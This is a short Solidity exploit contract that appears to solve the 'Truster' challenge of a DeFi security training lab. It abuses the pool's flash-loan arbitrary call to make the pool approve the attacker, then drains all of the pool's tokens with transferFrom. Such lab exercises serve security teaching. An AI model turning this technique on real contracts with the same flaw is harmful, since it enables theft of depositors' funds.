// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../truster/TrusterLenderPool.sol";

contract TrusterLenderAttacker {
    IERC20 immutable dvt;
    TrusterLenderPool immutable pool;
    address immutable owner;
    uint256 immutable poolToken;

    constructor(
        address _dvtAddress,
        address _poolAddr,
        uint256 _poolToken
    ) {
        dvt = IERC20(_dvtAddress);
        pool = TrusterLenderPool(_poolAddr);
        owner = msg.sender;
        poolToken = _poolToken;
    }

    function drain() external {
        require(msg.sender == owner);

        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            poolToken
        );

        pool.flashLoan(0, owner, address(dvt), data);
        dvt.transferFrom(address(pool), owner, dvt.balanceOf(address(pool)));
    }
}
